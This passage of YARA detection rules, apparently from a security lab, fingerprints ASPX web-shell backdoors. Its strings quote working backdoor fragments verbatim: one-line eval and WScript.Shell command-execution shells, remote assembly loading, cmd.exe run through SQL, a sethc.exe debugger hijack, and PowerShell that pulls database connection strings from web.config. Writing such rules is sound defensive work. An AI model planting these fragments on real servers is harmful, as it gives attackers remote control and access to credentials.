        $s11 = "\"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]\"+            " fullword ascii
        $s12 = "Response.Write(eval(keng,\"unsafe\"));" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule fd29a80dc9fa82a939f7c3f5638114de5e8361cf
{
    meta:
        description = "aspx - file fd29a80dc9fa82a939f7c3f5638114de5e8361cf.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "80513c8872794816db8f64f796db5f42bf2df7f287141aea2de0c64e22ebd01a"
    strings:
        $x1 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)" fullword ascii
        $s2 = "response.Write(\"<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc\"&\"ript>\")" fullword ascii
        $s3 = "myProcessStartInfo.UseShellExecute = False" fullword ascii
        $s4 = "db_cmd.ExecuteNonQuery()" fullword ascii
        $s5 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)" fullword ascii
        $s6 = "response.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath" fullword ascii
        $s7 = "rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
        $s8 = "myProcessStartInfo.Arguments = CMDCommand.text" fullword ascii
        $s9 = "<asp:HyperLink id=\"HyperLink1\" runat=\"server\" Visible=\"True\" Target=\"_blank\" NavigateUrl=\"http://canglangjidi.qyun.n" fullword ascii
        $s10 = "recResult = adoConn.Execute(strQuery)" fullword ascii
        $s11 = "<asp:Label id=\"DB_exe\" runat=\"server\" height=\"37px\" visible=\"False\">Execute SQL :</asp:Label>" fullword ascii
        $s12 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s13 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s14 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)" fullword ascii
        $s15 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Hidden)" fullword ascii
        $s16 = "DataCStr.Text = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb\"" fullword ascii
        $s17 = "File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.System)" fullword ascii
        $s18 = "directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))" fullword ascii
        $s19 = "32\\cmd.exe</asp:TextBox>" fullword ascii
        $s20 = "rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_78c939717436eb5ca6707941a487a8f3d358f530
{
    meta:
        description = "aspx - file 78c939717436eb5ca6707941a487a8f3d358f530.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
    strings:
        $s1 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s2 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
        $s3 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s4 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s5 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#84B738;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s6 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s7 = "\" OnClick=\"Ybg\"></asp:LinkButton> | <asp:LinkButton ID=\"xxzE\" runat=\"server\" Text=\"Cmd" fullword ascii
        $s8 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s9 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s10 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s11 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s12 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s13 = "Ip : <input class=\"input\" runat=\"server\" id=\"llH\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s14 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> " fullword ascii
        $s15 = ": <input class=\"input\" runat=\"server\" id=\"dNohJ\" type=\"text\" size=\"20\" value=\"localadministrator\"/></td>" fullword ascii
        $s16 = "\" OnClick=\"PPtK\"></asp:LinkButton> | <asp:LinkButton ID=\"PVQ\" runat=\"server\" Text=\"Serv-U" fullword ascii
        $s17 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#e6f0ff;\">Web ManAger</div></div>" fullword ascii
        $s18 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"YZw\"/> " fullword ascii
        $s19 = "\" OnClick=\"jXhS\"></asp:LinkButton> | <asp:LinkButton ID=\"jNDb\" runat=\"server\" Text=\"" fullword ascii
        $s20 = "\" OnClick=\"VOxn\"></asp:LinkButton> | <asp:LinkButton ID=\"nuc\" runat=\"server\" Text=\"IIS" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule be0bf18f930543ad5643b7d1ae129cf89f37793e
{
    meta:
        description = "aspx - file be0bf18f930543ad5643b7d1ae129cf89f37793e.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "01a006377926b2e0b2552ae2f4d75f210c02422b5032a8aaae32976f54f41350"
    strings:
        $s1 = "popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"UmVxdWVzdC5JdGVtWyJ6Il0=\")))); " ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule b9464d1f07429cf4059cda852ae11e2132698687
{
    meta:
        description = "aspx - file b9464d1f07429cf4059cda852ae11e2132698687.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "429a8df7d45c1bf978d67b9d10dee34205ea16ce85d40f92cb0f7855300fd7bb"
    strings:
        $s1 = "<%=CreateObject(\"WScript.Shell\").exec(Request.Form(\"a\").trim).StdOut.ReadAll%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_3193ee6ccf2cf6c34a35e4c68dd62501e4ff1479
{
    meta:
        description = "aspx - file 3193ee6ccf2cf6c34a35e4c68dd62501e4ff1479.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "611bba6b24c3b5f8c2fd0b9a2bd4b803732bca204757520c33545ed79972f29f"
    strings:
        $x1 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -Ite" fullword ascii
        $x2 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Fil" fullword ascii
        $x3 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($file in (get-childitem $path -Filter web.config -Recu" fullword ascii
        $x4 = "<asp:TextBox id=\"xpath\" width=\"350\" runat=\"server\">c:\\windows\\system32\\cmd.exe</asp:TextBox><br><br>" fullword ascii
        $x5 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);\"" fullword ascii
        $x6 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-conten" fullword ascii
        $x7 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"remove-item $env:temp\\$tempdir -recurse;} \"" fullword ascii
        $x8 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.cip" fullword ascii
        $x9 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Filt" ascii
        $x10 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$ErrorActionPreference = 'SilentlyContinue';\" " fullword ascii
        $x11 = "<!-- Web shell - command execution, web.config parsing, and SQL query execution -->" fullword ascii
        $x12 = "<!-- SQL Query Execution - Execute arbitrary SQL queries (MSSQL only) based on extracted connection strings -->" fullword ascii
        $x13 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.con" fullword ascii
        $x14 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $" ascii
        $x15 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$ds=New-Object system.Data.DataSet;\"" fullword ascii
        $x16 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Try { $connstrings = $xml.get_DocumentElement(); } Catch { cont" fullword ascii
        $x17 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -ItemT" ascii
        $x18 = "<!-- Command execution - Run arbitrary Windows commands -->" fullword ascii
        $x19 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
        $x20 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 60KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule sig_65ba873893de301fda3df3c09e93a04f7b31861b
{
    meta:
        description = "aspx - file 65ba873893de301fda3df3c09e93a04f7b31861b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b49f86c52ea35879051e4226c3043f01ff938613eddfbefd33f7a6ae99cfc56d"
    strings:
        $s1 = "dim mywrite as new streamwriter(request.form(\"path\"), true, encoding.default) mywrite.write(request.form(\"content\")) " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule e649686ecd8f436d8a626ddb80999cb649852ed9
{
    meta:
        description = "aspx - file e649686ecd8f436d8a626ddb80999cb649852ed9.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8b2a61f29fdeda908d299515975a4dd3abd1a7508dbe8487bcb2a56fad2ec16f"
    strings:
        $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
        $x2 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32\\\\ias\\\\ias" ascii
        $x3 = "ion\\\\Image File Execution Options\\\\sethc.exe','debugger','REG_SZ','c:\\\\windows\\\\explorer.exe' \";" fullword ascii
        $x4 = "SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
        $x5 = "Response.AddHeader (\"Content-Disposition\",\"attachment;filename=\" + HttpUtility.UrlEncode (fi.Name,System.Text.En" fullword ascii
        $x6 = "<asp:TextBox ID=\"cmdurl\" runat=\"server\" Width=\"320px\" Font-Size=\"12px\">cmd.exe</asp:TextBox></td>" fullword ascii
        $x7 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x8 = "agentcmd.ExecuteNonQuery();" fullword ascii
        $x9 = "SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
        $x10 = "SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
        $x11 = "SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
        $x12 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32" fullword ascii
        $x13 = "SqlConnection getpconn = new SqlConnection(\"server=.\" + oportstr + \";User ID=\" + osqlnamestr + \";Password=\" + osqlpassst" fullword ascii
        $x14 = "string connstrs = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim() + \";d" fullword ascii
        $x15 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x16 = "string connstr = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim(" fullword ascii
        $x17 = "getocmd.ExecuteNonQuery();           " fullword ascii
        $x18 = "SqlConnection conn = new SqlConnection(\"server=.\" + kp + \";User ID=\" + kusqlname.Text + \";Password=\" + kusqlpass.Tex" fullword ascii
        $x19 = "File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);" fullword ascii
        $x20 = "string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image" ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule sig_01c1569704a53a97e470bc3b3862e8fe749e0d1c
{
    meta:
        description = "aspx - file 01c1569704a53a97e470bc3b3862e8fe749e0d1c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f3d2eb157452e8cdbe6d9ca1f5ba41f022512a06f44789b3c3d263c860b6cd90"
    strings:
        $s1 = "ewgjewgewjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre*/ %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( all of them ) ) or ( all of them )
}

rule sig_42a14ca11a6e1182af10c577babc48a0edbf0f6d
{
    meta:
        description = "aspx - file 42a14ca11a6e1182af10c577babc48a0edbf0f6d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d9793ad7dba95b1cad24bca0ad65224bdf8ee293792ca79a874513ae926fb7a7"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"chopper\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_216c1dd950e0718e35bc4834c5abdc2229de3612
{
    meta:
        description = "aspx - file 216c1dd950e0718e35bc4834c5abdc2229de3612.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2818481cbcbc4c7d8ff882581a7ff20ffdf5d9b8f3c64a51770541c11c6985a5"
    strings:
        $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
        $x2 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32\\\\ias\\\\ias" ascii
        $x3 = "ion\\\\Image File Execution Options\\\\sethc.exe','debugger','REG_SZ','c:\\\\windows\\\\explorer.exe' \";" fullword ascii
        $x4 = "SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
        $x5 = "Response.AddHeader (\"Content-Disposition\",\"attachment;filename=\" + HttpUtility.UrlEncode (fi.Name,System.Text.En" fullword ascii
        $x6 = "<asp:TextBox ID=\"cmdurl\" runat=\"server\" Width=\"320px\" Font-Size=\"12px\">cmd.exe</asp:TextBox></td>" fullword ascii
        $x7 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x8 = "agentcmd.ExecuteNonQuery();" fullword ascii
        $x9 = "SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
        $x10 = "SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
        $x11 = "SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
        $x12 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32" fullword ascii
        $x13 = "SqlConnection getpconn = new SqlConnection(\"server=.\" + oportstr + \";User ID=\" + osqlnamestr + \";Password=\" + osqlpassst" fullword ascii
        $x14 = "string connstrs = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim() + \";d" fullword ascii
        $x15 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x16 = "string connstr = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim(" fullword ascii
        $x17 = "getocmd.ExecuteNonQuery();           " fullword ascii
        $x18 = "SqlConnection conn = new SqlConnection(\"server=.\" + kp + \";User ID=\" + kusqlname.Text + \";Password=\" + kusqlpass.Tex" fullword ascii
        $x19 = "File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);" fullword ascii
        $x20 = "string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule sig_637e175f7df506bae1a4d078ff8fba6c342a6847
{
    meta:
        description = "aspx - file 637e175f7df506bae1a4d078ff8fba6c342a6847.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1acb5e3b3519a21df9c98aa43a10e58bde5a207813e03fdf1ebdf1405b6c62eb"
    strings:
        $s1 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c79444d1ca7e2f580d32976ae39628d3cfd00214
{
    meta:
        description = "aspx - file c79444d1ca7e2f580d32976ae39628d3cfd00214.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d4fb7efb46331d500e4c70bc905209e7734d753e139ce83f4c9a481bd26ca6a7"
    strings:
        $x1 = "string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=" ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "@s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_make" ascii
        $x4 = "<strong>Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></strong>" fullword ascii
        $x5 = "<strong>Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></strong" fullword ascii
        $x6 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x7 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s8 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s9 = "ClientScript.RegisterStartupScript(this.GetType(), \"\", \"document.write(\\\"\" + Encoding.ASCII.GetString(cc) + Request." fullword ascii
        $s10 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s11 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s12 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s13 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s14 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s15 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s16 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2008 Bin -> <a href=\"http://www." fullword ascii
        $s17 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
        $s18 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s19 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
        $s20 = "Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d89eb9e20fe2083faf35bd2be00071d11e85df06
{
    meta:
        description = "aspx - file d89eb9e20fe2083faf35bd2be00071d11e85df06.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e9465c7dff9e79d4d9d05d016cf86bdd9959729707ca59ef1cfc6272d517a573"
    strings:
        $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
        $x2 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32\\\\ias\\\\ias" ascii
        $x3 = "ion\\\\Image File Execution Options\\\\sethc.exe','debugger','REG_SZ','c:\\\\windows\\\\explorer.exe' \";" fullword ascii
        $x4 = "SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
        $x5 = "Response.AddHeader (\"Content-Disposition\",\"attachment;filename=\" + HttpUtility.UrlEncode (fi.Name,System.Text.En" fullword ascii
        $x6 = "<asp:TextBox ID=\"cmdurl\" runat=\"server\" Width=\"320px\" Font-Size=\"12px\">cmd.exe</asp:TextBox></td>" fullword ascii
        $x7 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x8 = "agentcmd.ExecuteNonQuery();" fullword ascii
        $x9 = "SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
        $x10 = "SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
        $x11 = "SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
        $x12 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32" fullword ascii
        $x13 = "SqlConnection getpconn = new SqlConnection(\"server=.\" + oportstr + \";User ID=\" + osqlnamestr + \";Password=\" + osqlpassst" fullword ascii
        $x14 = "string connstrs = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim() + \";d" fullword ascii
        $x15 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x16 = "string connstr = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim(" fullword ascii
        $x17 = "getocmd.ExecuteNonQuery();           " fullword ascii
        $x18 = "SqlConnection conn = new SqlConnection(\"server=.\" + kp + \";User ID=\" + kusqlname.Text + \";Password=\" + kusqlpass.Tex" fullword ascii
        $x19 = "File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);" fullword ascii
        $x20 = "string sayx = \"exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image" ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 300KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule sig_8767d1392e895c5fa662b40618181c0e15ee1d00
{
    meta:
        description = "aspx - file 8767d1392e895c5fa662b40618181c0e15ee1d00.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d4fe072720823db02f2c9e09a5e285a2307be29452f193f73ef12833b2f92b6a"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule da0c7fd27dfa7f400a82ef16109003517384c8b4
{
    meta:
        description = "aspx - file da0c7fd27dfa7f400a82ef16109003517384c8b4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4d2c5711a8f2d45d1aeadde69fa81fbfe7378794344e0fa31949ac6fd633271a"
    strings:
        $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
        $x2 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32\\\\ias\\\\ias" ascii
        $x3 = "ion\\\\Image File Execution Options\\\\sethc.exe','debugger','REG_SZ','c:\\\\windows\\\\explorer.exe' \";" fullword ascii
        $x4 = "SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
        $x5 = "Response.AddHeader (\"Content-Disposition\",\"attachment;filename=\" + HttpUtility.UrlEncode (fi.Name,System.Text.En" fullword ascii
        $x6 = "<asp:TextBox ID=\"cmdurl\" runat=\"server\" Width=\"320px\" Font-Size=\"12px\">cmd.exe</asp:TextBox></td>" fullword ascii
        $x7 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x8 = "agentcmd.ExecuteNonQuery();" fullword ascii
        $x9 = "SqlDataReader jkkudr = getocmd.ExecuteReader();" fullword ascii
        $x10 = "SqlDataReader jksdr = getocmd.ExecuteReader();" fullword ascii
        $x11 = "SqlDataReader deldr = getocmd.ExecuteReader();" fullword ascii
        $x12 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32" fullword ascii
        $x13 = "SqlConnection getpconn = new SqlConnection(\"server=.\" + oportstr + \";User ID=\" + osqlnamestr + \";Password=\" + osqlpassst" fullword ascii
        $x14 = "string connstrs = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim() + \";d" fullword ascii
        $x15 = "string agentsql = \"EXEC sp_add_job @job_name = 'jktest',\" + \" @enabled = 1,\" + \" @delete_level = 1\" + \" EXEC sp_add_jobst" ascii
        $x16 = "string connstr = \"server=.\" + getport + \";User ID=\" + sqlname.Text.Trim() + \";Password=\" + sqlpass.Text.Trim(" fullword ascii
        $x17 = "getocmd.ExecuteNonQuery();           " fullword ascii
